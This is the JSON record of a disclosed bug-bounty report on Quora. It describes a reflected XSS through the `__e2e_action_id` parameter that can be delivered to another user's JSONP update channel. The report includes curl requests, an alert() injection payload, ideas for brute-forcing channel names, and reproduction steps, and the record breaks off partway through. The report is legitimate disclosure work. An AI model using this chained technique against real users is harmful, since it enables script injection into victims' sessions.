{"id":259100,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTkxMDA=","url":"https://hackerone.com/reports/259100","title":"XSS through `__e2e_action_id` delivered by JSONP","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-08-11T21:09:40.457Z","submitted_at":"2017-08-11T21:09:40.457Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xnan","url":"/0xnan","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3152,"url":"https://hackerone.com/quora","handle":"quora","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Quora","twitter_handle":"quora","website":"http://www.quora.com","about":"A place to share knowledge and better understand the world."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-08T18:54:18.108Z","bug_reporter_agreed_on_going_public_at":"2018-03-08T15:44:00.151Z","team_member_agreed_on_going_public_at":"2018-03-08T18:54:17.925Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Summary:\n\nThe `__e2e_action_id` params used with POST requests to `/server_call_POST?_m=*` endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.\nAlso, another issue on some methods (such as `/server_call_POST?_m=edit`) allows - with a *strong* premise discussed on the description - *any* authenticated user to deliver the vulnerability to another user without any interaction.\n\n# Description\n\n## XXS\nOn the Web Application http://www.quora.com most user actions are performed as POST on `/server_call_POST?_m=*`, implementing AJAX architecture.\nOn the client side these requests are processed by  `./shared/core/rpc.js` library that in turns uses the library `./actions.js` to define \"actions\" which have an ID `__e2e_action_id` and some methods such as startAction() and **finishAction(id, ...)**.  \nThe `__e2e_eaction_id` is generated for every request with `id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36)` so its value is intended to be composed by [0-9a-z].\n\nWhen a user performs an action, this ID is embedded on the POST request and with some methods (for\nexample `/server_call_POST?_m=load_menu`) its content is reflected back as first argument of\nfinishAction().  For example a \"normal\" call, with `__e2e_action_id=esko02tjqe` is the following (I've omitted most headers/params/data):\n\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=####\u0026_m=load_menu'  \n-data 'json=...\u0026__e2e_action_id=esko02tjqe\u0026...'\n\n\u003e POST /webnode2/server_call_POST?_v=█████\u0026_m=load_menu HTTP/1.1\n\u003e Host: www.quora.com\n\u003e Cookie: █████████████████████\n...\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: application/json; charset=utf-8\n\u003c Server: nginx\n\u003c \n{\"value\": {\n     \"html\": ..., \n      \"css\": .......,                             (↓↓↓↓↓↓ reflected ID)\n       \"js\": \"require('actions').finishAction('esko02tjqe', {\\\"controller\\\": \\\"webnode2\\\", \\\"action\\\": \\\"server_call_POST\\\", \\\"standard\\\": {}, \\\"serverTime\\\": 34511, \\\"mustReport\\\": true});\\n            var webnode = require('shared/core/webnode');\\n   ....     \"}, \n   \"pmsg\": null}\n```\nSince no escaping is performed, it is possible to inject code, for example setting `__e2e_action_id=',alert(),'` which will produce:\n```\n...\n \"js\": \"require('actions').finishAction('',alert(),'', {\\\"cont... \"}, \n...\n```\ncreating a valid js section that execute `alert()`.\nFortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is `./shared/core/rpc.js` that execute the response (that has a content type of `application/json`) and seems that there is no way to directly set the `__e2e_action_id` on a session of Quora (a new one is generated  for each action).\n\n## Deliver the XSS using JSONP\n\nI've noticed another \"vulnerability\" that can be chained with the aforementioned to be able to effectively\ndeliver the XSS to an user.\nWhen an user is on Quora, to its page is associated a \"channel\" (I hope this is the correct name) such as `main-w-dep3105-32490323....` and there is always a request that try to fetch new \"update\" from a\nchannel (restarted each time it returns).  \nThis request is `update` on *.tch.quora.com, for example:\n\n```\nREQUEST\nhttps://tch969298.tch.quora.com/up/chan43-8888/updates?\u0026callback=jsonp\u003ccallback_name\u003e\u0026channel=main-w-dep3105-32490323....\u0026hash=16762940...\n\nPOSSIBLE RESPONSE:\njsonp\u003ccallback_name\u003e({\"messages\":[\"require.whenReady(\\\"main\\\", function() {\\n ... ,\"min_seq\":1591113381})\n```\n\nThe action `/server_call_POST?_m=edit` (used for example when an user change its profile description), do not behave like `/server_call_POST?_m=load_menu` (described in the first section). What I mean is that they do not reply with the response `{\"value\": {\"html\": ..., \"css\": ...., \"js\": ...}, \"pmsg\": \"\"}` to update the page but they reply with a response `{\"value\": null, \"pmsg\": null}` and *deliver the update through a message on the channel of the user*.\n\nFor example after a `/server_call_POST?_m=edit` with `__e2e_action_id=eskrisktsq` the `/update?` request reply with:\n```\njsonp\u003ccallback_name\u003e({\"messages\":[\"require.whenReady(\\\"main\\\", function()\n {require('actions').finishAction('eskrisktsq' ... \u003cother data of the edit action\u003e\n                                     ↑↑↑↑↑\n             (__e2e_action_id of the _m=edit call reflected)\n     \n```\non which `eskrisktsq` is the `__e2e_action_id` used on the `_m=edit` call vulnerable to XSS.\nThe fact that `_m=edit` sent a message to the channel `main-w-dep3105-32490323....` it's because this channel is specified as parameter on the request `_m=edit`:\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=███████\u0026_m=edit' \n--data 'json={\n\"args\":[],\"kwargs\":{the data of the edit}}\u0026\nrevision=███████████\u0026\nformkey=███████████\u0026\npostkey=███████████\u0026\nwindow_id=dep3105-32490323....\u0026                          ← specified here\n_lm_window_id=dep3105-32490323....\u0026                      ←   and here\n__e2e_action_id=eskrisktsq\u0026\n\u0026__vcon_json=[█████]\u0026.....' \n```\n\nThe real problem is that this method **do not check if the specified channel is associated to user session who performed the call**. So what could happen is that the attacker can send the XSS to\na specified channel name that will be triggered as soon as the `update?` request (of the victim user) receives the evil data, without any interaction of the victim.\nThe *effect* of `_m=edit` (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but *the finishAction() message* (vulnerable to XSS) is sent to the *victim* channel name.\n\nI can confirm that this behavior is not present on other methods: for example with `_m=load_menu` if you try to change the `window_id` you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as `_m=edit`.  \nI've not tested other methods, anyway I think that all the methods that reply with `{\"value\": null, \"pmsg\": null}` are vulnerable but not the ones that reply with the update directly (as `_m=load_menu` does) .\n\nThe *strong* premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.\n\nAnyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:\n\n   0. There could be easy ways that I did not find to leak valid channel_name\n   1. The attack can't be stopped from browser XSS filters\n   2. The XSS seems to work only on Quora.com (Android do not use `__e2e_action_id`, IOs not tested)\n   3. A channel_name is composed of `dep\u003c4 digit[0-9]\u003e-\u003cup to 19 digit[0-9]\u003e`. Valid 4 digits for `dep`\n can be leaked using `https://www.quora.com/check_livedeps/index?window_id=dep3304-`\n  that seems to respond with \"ok\" if the 4 digits (in this case 3304) are part of a channel alive.\n   4. the remaining part is infeasible to enumerate (10^19), but should be noted that:\n     -  doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.\n     - if the XSS is sent to a channel_name that is not used by any user and Quora assigns this\n       channel_name, up to 5minutes **later** the evil request was sent, the XSS is delivered correctly.\n       (BTW I do not know if Quora would assign a channel name on which a message is already \"pending\")\n     -I think the attacker can keep busy some channels name (reducing the space to enumerate),\nlogging and executing the same code that Quora uses to attach a channel to an user, e.g:   \n\n````\n require(\"tchannel_up\").start(0, \"main-w-dep3104-34040...\", \"2287....\", \"chan42-8888\", \"quora.com\", \"\");\n\nor simply a repeated GET on:\n\nhttps://tch969298.tch.quora.com/up/chan42-8888/updates?\u0026callback=jsonp\u003ccallback_name\u003e\u0026channel=main-w-dep3104-34040...\u0026hash=2287....\n```` \nsince seems that there isn't a limit on how much \"active\" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the `hash` params - and works).\n\n\n### Steps To Reproduce\n\nI describe the steps using browser Chromium, but it is not stricly necessary\n\n1. Attacker log in on Quora.com and goes on its profile page \n2. Attacker open developer tools of its browser and goes on the \"Network\" tab\n3. Attacker update its profile description using dummy data and copy the request performed on `server_call_POST?_m=edit`, eg:\n    \n    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK\u0026_m=edit' -H 'Cookie: m-b=\"██████████████████\"; m-sa=1; m-s=\"███████████████\"; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/Aleph-NaN' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={\"args\":[],\"kwargs\":{\"id\":███████████,\"input\":{\"sections\":[{\"type\":\"plain\",\"indent\":0,\"quoted\":false,\"spans\":[{\"modifiers\":{},\"text\":\"a\"}]}],\"caret\":{\"start\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1},\"end\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1}}}}}\u0026revision=904d048187b642341464067b64246119b8ce9489\u0026formkey=6a34c75ed7fda8439ca2407b4520c974\u0026postkey=736f2eea9e3826808823625bf4ede215\u0026window_id=dep3204-1727465467565139446\u0026referring_controller=user\u0026referring_action=profile\u0026_lm_transaction_id=0.7159021828610441\u0026_lm_window_id=dep3204-1727465467565139446\u0026__vcon_json=[\"2rtUq6Z4HO9gWK\"]\u0026__vcon_method=edit\u0026__e2e_action_id=esl2xq4xyj\u0026js_init={\"id\":████████████,\"input\":\"user_description_text\",\"typing_area\":null,\"draft_space\":null,\"unsaved_content_msg\":\"Your content has not been saved.\",\"focus_onload\":false,\"is_qtext\":true,\"require_comment\":false,\"require_value\":false,\"content_type\":null,\"submit_text\":\"Update\",\"show_editor\":false}\u0026__metadata={}' --compressed ```\n4. the attacker obtain the victim channel name, eg: `dep3501-3261853912009855464`\n5. the attacker modify its previusly copied request, setting the `window_id` and `_lm_window_id` parameters to the victim channel name\n6. the attacker modify the request, setting the `__e2e_action_id` parameter to inject its javascript payload, for example to `',alert(1),'`, eg: \n    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK\u0026_m=edit' -H 'Cookie: m-b=\"██████████████\"; m-sa=1; m-s=\"█████████████████\"; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/████' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={\"args\":[],\"kwargs\":{\"id\":█████████,\"input\":{\"sections\":[{\"type\":\"plain\",\"indent\":0,\"quoted\":false,\"spans\":[{\"modifiers\":{},\"text\":\"a\"}]}],\"caret\":{\"start\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1},\"end\":{\"spanIdx\":0,\"sectionIdx\":0,\"offset\":1}}}}}\u0026revision=904d048187b642341464067b64246119b8ce9489\u0026formkey=6a34c75ed7fda8439ca2407b4520c974\u0026postkey=736f2eea9e3826808823625bf4ede215\u0026window_id=dep3501-3261853912009855464\u0026referring_controller=user\u0026referring_action=profile\u0026_lm_transaction_id=0.7159021828610441\u0026_lm_window_id=dep3501-3261853912009855464\u0026__vcon_json=[\"2rtUq6Z4HO9gWK\"]\u0026__vcon_method=edit\u0026__e2e_action_id=\\',alert(1),\\'\u0026js_init={\"id\":████████,\"input\":\"user_description_text\",\"typing_area\":null,\"draft_space\":null,\"unsaved_content_msg\":\"Your content has not been saved.\",\"focus_onload\":false,\"is_qtext\":true,\"require_comment\":false,\"require_value\":false,\"content_type\":null,\"submit_text\":\"Update\",\"show_editor\":false}\u0026__metadata={}' --compressed ```\n7. the attacker send the request\n8. on the victim page will be executed `alert(1)`\n\nNotice that the cookie, postkey, formkey and other data are of the attacker session.\n\n### Enviroment\nTools used: `curl` and `chromium`\n\n### Suggested fix\n- correctly escape `__e2e_action_id`\n- do not allow to specify a channel name (`window_id` parameter) that is not \"attached\" to the session of the caller\n\n\nI can provide a demonstrating video if required or other info. \nThe severity was calculated with the Hackerone Calculator.","vulnerability_information_html":"\u003ch1 id=\"summary\"\u003eSummary:\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ccode\u003e__e2e_action_id\u003c/code\u003e params used with POST requests to \u003ccode\u003e/server_call_POST?_m=*\u003c/code\u003e endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.\u003cbr\u003e\nAlso, another issue on some methods (such as \u003ccode\u003e/server_call_POST?_m=edit\u003c/code\u003e) allows - with a \u003cem\u003estrong\u003c/em\u003e premise discussed on the description - \u003cem\u003eany\u003c/em\u003e authenticated user to deliver the vulnerability to another user without any interaction.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003ch2 id=\"xxs\"\u003eXXS\u003c/h2\u003e\n\n\u003cp\u003eOn the Web Application \u003ca title=\"http://www.quora.com\" href=\"/redirect?url=http%3A%2F%2Fwww.quora.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.quora.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e most user actions are performed as POST on \u003ccode\u003e/server_call_POST?_m=*\u003c/code\u003e, implementing AJAX architecture.\u003cbr\u003e\nOn the client side these requests are processed by  \u003ccode\u003e./shared/core/rpc.js\u003c/code\u003e library that in turns uses the library \u003ccode\u003e./actions.js\u003c/code\u003e to define \u0026quot;actions\u0026quot; which have an ID \u003ccode\u003e__e2e_action_id\u003c/code\u003e and some methods such as startAction() and \u003cstrong\u003efinishAction(id, ...)\u003c/strong\u003e.\u003cbr\u003e\u003cbr\u003e\nThe \u003ccode\u003e__e2e_eaction_id\u003c/code\u003e is generated for every request with \u003ccode\u003eid = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36)\u003c/code\u003e so its value is intended to be composed by [0-9a-z].\u003c/p\u003e\n\n\u003cp\u003eWhen a user performs an action, this ID is embedded on the POST request and with some methods (for\u003cbr\u003e\nexample \u003ccode\u003e/server_call_POST?_m=load_menu\u003c/code\u003e) its content is reflected back as first argument of\u003cbr\u003e\nfinishAction().  For example a \u0026quot;normal\u0026quot; call, with \u003ccode\u003e__e2e_action_id=esko02tjqe\u003c/code\u003e is the following (I\u0026#39;ve omitted most headers/params/data):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;https://www.quora.com/webnode2/server_call_POST?_v=####\u0026amp;_m=load_menu\u0026#39;  \n-data \u0026#39;json=...\u0026amp;__e2e_action_id=esko02tjqe\u0026amp;...\u0026#39;\n\n\u0026gt; POST /webnode2/server_call_POST?_v=█████\u0026amp;_m=load_menu HTTP/1.1\n\u0026gt; Host: www.quora.com\n\u0026gt; Cookie: █████████████████████\n...\n\u0026lt; HTTP/1.1 200 OK\n\u0026lt; Content-Type: application/json; charset=utf-8\n\u0026lt; Server: nginx\n\u0026lt; \n{\u0026quot;value\u0026quot;: {\n     \u0026quot;html\u0026quot;: ..., \n      \u0026quot;css\u0026quot;: .......,                             (↓↓↓↓↓↓ reflected ID)\n       \u0026quot;js\u0026quot;: \u0026quot;require(\u0026#39;actions\u0026#39;).finishAction(\u0026#39;esko02tjqe\u0026#39;, {\\\u0026quot;controller\\\u0026quot;: \\\u0026quot;webnode2\\\u0026quot;, \\\u0026quot;action\\\u0026quot;: \\\u0026quot;server_call_POST\\\u0026quot;, \\\u0026quot;standard\\\u0026quot;: {}, \\\u0026quot;serverTime\\\u0026quot;: 34511, \\\u0026quot;mustReport\\\u0026quot;: true});\\n            var webnode = require(\u0026#39;shared/core/webnode\u0026#39;);\\n   ....     \u0026quot;}, \n   \u0026quot;pmsg\u0026quot;: null}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince no escaping is performed, it is possible to inject code, for example setting \u003ccode\u003e__e2e_action_id=\u0026#39;,alert(),\u0026#39;\u003c/code\u003e which will produce:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e...\n \u0026quot;js\u0026quot;: \u0026quot;require(\u0026#39;actions\u0026#39;).finishAction(\u0026#39;\u0026#39;,alert(),\u0026#39;\u0026#39;, {\\\u0026quot;cont... \u0026quot;}, \n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ecreating a valid js section that execute \u003ccode\u003ealert()\u003c/code\u003e.\u003cbr\u003e\nFortunately this vulnerability can\u0026#39;t be triggered as it is because this would require the malformed request to be sent by Quora.com since it is \u003ccode\u003e./shared/core/rpc.js\u003c/code\u003e that execute the response (that has a content type of \u003ccode\u003eapplication/json\u003c/code\u003e) and seems that there is no way to directly set the \u003ccode\u003e__e2e_action_id\u003c/code\u003e on a session of Quora (a new one is generated  for each action).\u003c/p\u003e\n\n\u003ch2 id=\"deliver-the-xss-using-jsonp\"\u003eDeliver the XSS using JSONP\u003c/h2\u003e\n\n\u003cp\u003eI\u0026#39;ve noticed another \u0026quot;vulnerability\u0026quot; that can be chained with the aforementioned to be able to effectively\u003cbr\u003e\ndeliver the XSS to an user.\u003cbr\u003e\nWhen an user is on Quora, to its page is associated a \u0026quot;channel\u0026quot; (I hope this is the correct name) such as \u003ccode\u003emain-w-dep3105-32490323....\u003c/code\u003e and there is always a request that try to fetch new \u0026quot;update\u0026quot; from a\u003cbr\u003e\nchannel (restarted each time it returns).\u003cbr\u003e\u003cbr\u003e\nThis request is \u003ccode\u003eupdate\u003c/code\u003e on *.tch.quora.com, for example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eREQUEST\nhttps://tch969298.tch.quora.com/up/chan43-8888/updates?\u0026amp;callback=jsonp\u0026lt;callback_name\u0026gt;\u0026amp;channel=main-w-dep3105-32490323....\u0026amp;hash=16762940...\n\nPOSSIBLE RESPONSE:\njsonp\u0026lt;callback_name\u0026gt;({\u0026quot;messages\u0026quot;:[\u0026quot;require.whenReady(\\\u0026quot;main\\\u0026quot;, function() {\\n ... ,\u0026quot;min_seq\u0026quot;:1591113381})\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe action \u003ccode\u003e/server_call_POST?_m=edit\u003c/code\u003e (used for example when an user change its profile description), do not behave like \u003ccode\u003e/server_call_POST?_m=load_menu\u003c/code\u003e (described in the first section). What I mean is that they do not reply with the response \u003ccode\u003e{\u0026quot;value\u0026quot;: {\u0026quot;html\u0026quot;: ..., \u0026quot;css\u0026quot;: ...., \u0026quot;js\u0026quot;: ...}, \u0026quot;pmsg\u0026quot;: \u0026quot;\u0026quot;}\u003c/code\u003e to update the page but they reply with a response \u003ccode\u003e{\u0026quot;value\u0026quot;: null, \u0026quot;pmsg\u0026quot;: null}\u003c/code\u003e and \u003cem\u003edeliver the update through a message on the channel of the user\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eFor example after a \u003ccode\u003e/server_call_POST?_m=edit\u003c/code\u003e with \u003ccode\u003e__e2e_action_id=eskrisktsq\u003c/code\u003e the \u003ccode\u003e/update?\u003c/code\u003e request reply with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ejsonp\u0026lt;callback_name\u0026gt;({\u0026quot;messages\u0026quot;:[\u0026quot;require.whenReady(\\\u0026quot;main\\\u0026quot;, function()\n {require(\u0026#39;actions\u0026#39;).finishAction(\u0026#39;eskrisktsq\u0026#39; ... \u0026lt;other data of the edit action\u0026gt;\n                                     ↑↑↑↑↑\n             (__e2e_action_id of the _m=edit call reflected)\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eon which \u003ccode\u003eeskrisktsq\u003c/code\u003e is the \u003ccode\u003e__e2e_action_id\u003c/code\u003e used on the \u003ccode\u003e_m=edit\u003c/code\u003e call vulnerable to XSS.\u003cbr\u003e\nThe fact that \u003ccode\u003e_m=edit\u003c/code\u003e sent a message to the channel \u003ccode\u003emain-w-dep3105-32490323....\u003c/code\u003e it\u0026#39;s because this channel is specified as parameter on the request \u003ccode\u003e_m=edit\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;https://www.quora.com/webnode2/server_call_POST?_v=███████\u0026amp;_m=edit\u0026#39; \n--data \u0026#39;json={\n\u0026quot;args\u0026quot;:[],\u0026quot;kwargs\u0026quot;:{the data of the edit}}\u0026amp;\nrevision=███████████\u0026amp;\nformkey=███████████\u0026amp;\npostkey=███████████\u0026amp;\nwindow_id=dep3105-32490323....\u0026amp;                          ← specified here\n_lm_window_id=dep3105-32490323....\u0026amp;                      ←   and here\n__e2e_action_id=eskrisktsq\u0026amp;\n\u0026amp;__vcon_json=[█████]\u0026amp;.....\u0026#39; \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe real problem is that this method \u003cstrong\u003edo not check if the specified channel is associated to user session who performed the call\u003c/strong\u003e. So what could happen is that the attacker can send the XSS to\u003cbr\u003e\na specified channel name that will be triggered as soon as the \u003ccode\u003eupdate?\u003c/code\u003e request (of the victim user) receives the evil data, without any interaction of the victim.\u003cbr\u003e\nThe \u003cem\u003eeffect\u003c/em\u003e of \u003ccode\u003e_m=edit\u003c/code\u003e (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but \u003cem\u003ethe finishAction() message\u003c/em\u003e (vulnerable to XSS) is sent to the \u003cem\u003evictim\u003c/em\u003e channel name.\u003c/p\u003e\n\n\u003cp\u003eI can confirm that this behavior is not present on other methods: for example with \u003ccode\u003e_m=load_menu\u003c/code\u003e if you try to change the \u003ccode\u003ewindow_id\u003c/code\u003e you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as \u003ccode\u003e_m=edit\u003c/code\u003e.\u003cbr\u003e\u003cbr\u003e\nI\u0026#39;ve not tested other methods, anyway I think that all the methods that reply with \u003ccode\u003e{\u0026quot;value\u0026quot;: null, \u0026quot;pmsg\u0026quot;: null}\u003c/code\u003e are vulnerable but not the ones that reply with the update directly (as \u003ccode\u003e_m=load_menu\u003c/code\u003e does) .\u003c/p\u003e\n\n\u003cp\u003eThe \u003cem\u003estrong\u003c/em\u003e premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.\u003c/p\u003e\n\n\u003cp\u003eAnyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThere could be easy ways that I did not find to leak valid channel_name\u003c/li\u003e\n\u003cli\u003eThe attack can\u0026#39;t be stopped from browser XSS filters\u003c/li\u003e\n\u003cli\u003eThe XSS seems to work only on Quora.com (Android do not use \u003ccode\u003e__e2e_action_id\u003c/code\u003e, IOs not tested)\u003c/li\u003e\n\u003cli\u003eA channel_name is composed of \u003ccode\u003edep\u0026lt;4 digit[0-9]\u0026gt;-\u0026lt;up to 19 digit[0-9]\u0026gt;\u003c/code\u003e. Valid 4 digits for \u003ccode\u003edep\u003c/code\u003e\ncan be leaked using \u003ccode\u003ehttps://www.quora.com/check_livedeps/index?window_id=dep3304-\u003c/code\u003e\nthat seems to respond with \u0026quot;ok\u0026quot; if the 4 digits (in this case 3304) are part of a channel alive.\u003c/li\u003e\n\u003cli\u003ethe remaining part is infeasible to enumerate (10^19), but should be noted that:\n\n\u003cul\u003e\n\u003cli\u003e doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker\u0026#39;s Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.\u003c/li\u003e\n\u003cli\u003eif the XSS is sent to a channel_name that is not used by any user and Quora assigns this\nchannel_name, up to 5minutes \u003cstrong\u003elater\u003c/strong\u003e the evil request was sent, the XSS is delivered correctly.\n(BTW I do not know if Quora would assign a channel name on which a message is already \u0026quot;pending\u0026quot;)\n-I think the attacker can keep busy some channels name (reducing the space to enumerate),\nlogging and executing the same code that Quora uses to attach a channel to an user, e.g:\u003cbr\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e require(\u0026quot;tchannel_up\u0026quot;).start(0, \u0026quot;main-w-dep3104-34040...\u0026quot;, \u0026quot;2287....\u0026quot;, \u0026quot;chan42-8888\u0026quot;, \u0026quot;quora.com\u0026quot;, \u0026quot;\u0026quot;);\n\nor simply a repeated GET on:\n\nhttps://tch969298.tch.quora.com/up/chan42-8888/updates?\u0026amp;callback=jsonp\u0026lt;callback_name\u0026gt;\u0026amp;channel=main-w-dep3104-34040...\u0026amp;hash=2287....\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003esince seems that there isn\u0026#39;t a limit on how much \u0026quot;active\u0026quot; channel are reserved for a user session (I\u0026#39;ve not tried extensively, but i\u0026#39;ve executed 3 time the code with channel saved from past session - since you need the \u003ccode\u003ehash\u003c/code\u003e params - and works).\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps To Reproduce\u003c/h3\u003e\n\n\u003cp\u003eI describe the steps using browser Chromium, but it is not stricly necessary\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAttacker log in on Quora.com and goes on its profile page \u003c/li\u003e\n\u003cli\u003eAttacker open developer tools of its browser and goes on the \u0026quot;Network\u0026quot; tab\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAttacker update its profile description using dummy data and copy the request performed on \u003ccode\u003eserver_call_POST?_m=edit\u003c/code\u003e, eg:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ecurl \u0026#39;https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK\u0026amp;_m=edit\u0026#39; -H \u0026#39;Cookie: m-b=\u0026quot;██████████████████\u0026quot;; m-sa=1; m-s=\u0026quot;███████████████\u0026quot;; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915\u0026#39; -H \u0026#39;Origin: https://www.quora.com\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; -H \u0026#39;Accept: application/json, text/javascript, */*; q=0.01\u0026#39; -H \u0026#39;Referer: https://www.quora.com/profile/Aleph-NaN\u0026#39; -H \u0026#39;X-Requested-With: XMLHttpRequest\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;DNT: 1\u0026#39; --data 